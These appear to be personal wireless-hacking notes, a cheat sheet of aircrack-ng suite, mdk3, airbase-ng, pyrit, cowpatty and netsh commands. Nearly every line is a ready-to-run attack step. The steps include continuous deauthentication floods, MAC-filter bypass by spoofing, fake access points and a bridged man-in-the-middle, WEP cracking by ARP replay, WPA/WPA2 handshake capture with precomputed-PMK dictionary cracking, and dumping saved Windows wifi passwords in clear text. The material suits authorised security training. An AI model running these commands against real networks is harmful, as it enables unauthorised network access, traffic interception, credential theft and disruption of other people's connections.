1. monitor mode is like promiscuous mode of the ethernet world where all the traffic can be monitored at a given time on the current channel.

**Powering up the wireless card**
2. ifconfig wlan0 up ---> start the wireless card 

3. airmon-ng start wlan0 <channel> ---> monitor mode interface is created on top of the device for sniffing 

**Check active Access points and the stations/clients connecting to it**
4. airodump-ng --band bn wlan0mon ---> make the card hop through different channel and check wifi traffic

5. mdk3 wlan0mon b -n baba ---> Creating a fake AP broadcasting beacons with SSID baba

**Finding Hidden SSIDs**
6. 
	a. Passive way - monitor the network for clients to connect
	b. active way - break all the connections between clients and Access point and further monitor the traffic for assocication 
	traffic.
		
	(send the deauthentication notification packet to the clients)
	aireplay-ng --deauth 0 -a <BSSID> wlan0mon -D   

	--deauth 0 will continously send deauth packets
	-D disable AP detection

7. Bypassing MAC filters

	a. aireplay-ng --fakeauth 10 -e Logan wlan0mon  --> Trying a fake authentication using the wireless card when MAC filter is 	
	off(open network)
	b. aireplay-ng --fakeauth 10 -e Logan wlan0mon -h <whiteListedMacAddress> --> To spoof a mac address and fool the AP to allow
	authentication

8. Cracking Shared/WEP encyption
	
	a. aireplay-ng --fakeauth 10 -e Logan wlan0mon -y <KeyStreamFile>

9. Creating random soft wifi interface

	a. airbase-ng -a AA:AA:AA:AA:AA:AA -e Logan wlan0mon

10. MiTM over Wireless

	a. airbase-ng -a AA:AA:AA:AA:AA:AA -e Logan wlan0mon -v    ---> Broadcast fake AP SSID
	b. ifconfig at0 up  ---> Power up the soft interface created
	c. 
	
		 1. brctl addbr mitm  ---> creating bridge mitm with brctl
		 2. brctl addif mitm eth0  ---> adding interfaces to the bridge
		   brctl addif mitm at0

		 3. ifconfig eth0 0.0.0.0 up
		   ifconfig at0 0.0.0.0 up

		 4. ifconfig mitm up   ---> powering up the bridge interface
		 5. dhclient mitm & ---> running dhcp client on bridge interface 	
			---> bridge the 2 interfaces (at0 with the other interface that has internet On)

**links --> https://forums.kali.org/showthread.php?17926-Fake-access-point-ettercap-sslstrip

11. Breaking WEP

	a. airodump-ng --channel 6 wlan0mon --write <fileName> --bssid <bssid>  ---> Start dumping packets on the target channel 
	b. aireplay-ng --arpreplay -e Logan -h <macAddressOfVictim> wlan0mon ---> Replay arp packets (In parallel fire this command)
	3. aircrack-ng <capFile>  ---> Start cracking with aircrack

12. Cracking WPA/WPA2 (Dictionary based attack)
	a. airodump-ng mon0 --channel 6 --essid <wifiAPName> --write <file> ---> Capture the handshake
	b. use aircrack/ cowpatty along with the dictionary
	c. aircrack -w dict <pcapCaptureFile>

13. Cracking/Decrypting with airdecap-ng/ genpmk/ cowpatty/ pyrit - faster way

	a. airdecap-ng -e <essid> -p <passPhrase> <capturedPcapFile> -b <bssid>

	Fastening up the process by pre-calculating the PMKs and then trying the Dictionary attack with the already generated PMKs

	b. genpmk -f <dictionaryFile> -s <ESSID> -d <outputFile>  ---> Preshared key or PMK list creation
	c. cowpatty -d prePmks -s "Logan" -r malWpa2-01.cap  ---> Cracking with cowpatty

	With Pyrit

	d. pyrit -r <capFile containing handShake> analyze   ---> analyze the capture pcap file and derive handshakes and APs
	e. pyrit -o <pmkFile> -i <dictionaryFile> -e <ssid> passthrough

	f1. cowpatty -d <pmkFile> -s <ssid> -r <capturedPcapFile>
			or

	f2. pyrit -r <pcapfile> -i <precoputedPMKfile> attack_cowpatty	

	With Aircrack - analyze the handshake capture file

	g. aircrack -w dict <pcapCaptureFile>	

14. Creating a WEP, WPA fakes access point/ Honeypots	

	a. airbase-ng --essid Popeye -a aa:aa:aa:aa:aa:aa -c 13 mon1 (WEP)
	b. airbase-ng -W 1 --essid Popeye -a cc:cc:cc:cc:cc:cc -c 13 mon1 -z 2  (WPA)
	c. airbase-ng -W 1 --essid Popeye -a dd:dd:dd:dd:dd:dd -c 13 mon4 -Z 4  (WPA2)

15. WPA_Supplicant

	**wpa_supplication.conf** 

	ctrl_interface=/var/run/wpa_supplicant
	ap_scan=1

	network={
	ssid="Pop"
	proto=WPA
	key_mgmt=WPA-PSK
	pairwise=CCMP TKIP
	group=CCMP TKIP WEP104 WEP40
	psk="boloTarara"
	priority=2
	}

	**command**
	wpa_supplicant  -iwlan0 -c wpa_supplicant.conf
	
16. Windows WiFi commands

	a. netsh wlan show interfaces --> view all wifi interfaces

	b. netsh wlan show drivers  --> extract current wifi driver information

	c. netsh wlan show networks --> view available networks


	d. netsh wlan show profiles  --> view profiles of the wifi network that the windows machine has connected 

	e. netsh wlan show profiles name="SSID" --> look at the configuration details of a previously connected AP

	f. netsh wlan connect name="kela" interface="Wi-Fi" --> Connect to a wifi network from cmd

	g. netsh wlan export profile name="kela"  --> Dump the profile in an external file

	h. netsh wlan show profile name="kela" key=clear  --> Dump wifi password in plain text

	i. netsh wlan set hostednetwork mode=allow ssid=Ambanis key=l@urA1234     --> Creating a hosted network on windows
    	netsh wlan start hostednetwork






